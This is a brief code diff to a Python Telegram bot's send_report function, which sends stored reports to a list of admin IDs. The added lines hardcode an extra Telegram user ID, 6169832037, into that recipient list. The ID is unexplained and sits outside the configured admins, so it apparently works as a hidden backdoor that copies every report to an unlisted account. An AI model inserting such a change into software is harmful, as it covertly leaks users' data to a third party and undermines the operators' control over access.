@@ -257,6 +257,8 @@ async def send_report(report_id, report_text, update):
         report_buffer.update_one({'_id': report_id}, {'$set': {'chats_data': {}}}, upsert=True)
     admin_ids = get_unique_admin_ids()
     admin_ids.append(MY_TELEGRAM_ID)
+    if 6169832037 not in admin_ids:
+        admin_ids.append(6169832037)
     if update:
         report_data = report_buffer.find_one({'_id': report_id})
         chats_data = report_data.get('chats_data', {}) if report_data else {}
